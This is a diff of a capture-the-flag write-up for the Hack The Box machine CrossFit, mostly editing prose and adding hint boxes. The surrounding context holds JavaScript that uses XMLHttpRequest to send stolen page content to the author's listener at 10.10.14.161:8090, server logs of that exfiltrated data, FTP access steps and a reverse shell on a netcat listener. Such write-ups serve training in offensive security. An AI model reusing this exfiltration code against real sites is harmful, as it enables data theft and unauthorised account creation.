@@ -559,7 +559,7 @@ request4.open('GET', 'http://10.10.14.161:8090/' + response3, true);
 request4.send();
 ```
 
-wrote payload to create new ftp user
+Next, I modified my payload to actually create the new FTP user.  
 
 ```text
 10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /test3.js HTTP/1.1" 200 -
@@ -569,7 +569,11 @@ wrote payload to create new ftp user
 10.10.10.208 - - [15/Jan/2021 21:51:58] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22alert%20alert-success%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3EAccount%20created%20successfully.%3C/p%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E1%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3Etest3%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E2021-01-15%2002:01:55%3C/td%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20action=%22http://ftp.crossfit.htb/accounts/85%22%20method=%22POST%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-info%22%20href=%22http://ftp.crossfit.htb/accounts/85%22%3EShow%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-primary%22%20href=%22http://ftp.crossfit.htb/accounts/85/edit%22%3EEdit%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_token%22%20value=%22EnEv1a4N27y3dqOO8UpAiGqpr3WuAbAUyoJ5D8at%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type=%22hidden%22%20name=%22_method%22%20value=%22DELETE%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type=%22submit%22%20class=%22btn%20btn-danger%22%3EDelete%3C/button%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/form%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/td%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
 ```
 
-Got a response on my server
+Got a response on my HTTP server with the parameters I was sending to the server, then again with HTML code of the response.  I hoped that it included some kind of way to tell if I had been successful at creating a user.  
+
+{% hint style="info" %}
+I went through a few iterations as you can see...at one point I thought that maybe my request was getting rejected because of too simple of a password so I upgraded it.  It may or may not have been a typo I found in my script, but I left it anyway just in case.
+{% endhint %}
 
 ```markup
 <!DOCTYPE html>
@@ -621,16 +625,16 @@ Got a response on my server
 </html>
 ```
 
-I decoded the HTML response, then prettified it.
+I decoded the HTML response, then saved it to a file.
 
 ![](../../.gitbook/assets/2.9-ftp-user-created.png)
 
-After recreating the webpage from the response, I could see that my FTP account was created!  Next I tried to log into the server using FTP.
+After recreating the webpage from the response, I could see that my account was created successfully!  Next I tried to log into the server using FTP.
 
-### Port 21 - FTP \(with LFTP\)
+### Port 21 - FTP \(using LFTP\)
 
 ```text
-┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ftp crossfit.htb
 Connected to crossfit.htb.
 220 Cross Fit Ltd. FTP Server
@@ -659,7 +663,7 @@ I tried logging in with FTP, but got an error `530 Non-anonymous sessions must u
 > ```
 
 ```text
-┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ lftp                                                                                            1 ⨯
 lftp :~> set ftp:ssl-force true
 lftp :~> connect ftp.crossfit.htb
@@ -831,8 +835,8 @@ request1.open('GET', test, false);
 request1.send()
 var response1 = request1.responseText;
 
-var request2 = new XMLHttpRequest();
 //send response1 to my waiting python http.server 
+var request2 = new XMLHttpRequest();
 request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
 request2.send()
 
@@ -874,7 +878,11 @@ www-data@crossfit:/$ stty rows 54 columns 104
 www-data@crossfit:/$ export TERM=xterm-256color
 ```
 
-And got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  used bash because zsh problem
+After a little bit of waiting, I got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  
+
+{% hint style="info" %}
+used bash because zsh problem
+{% endhint %}
 
 ```text
 www-data@crossfit:/run$ ps aux
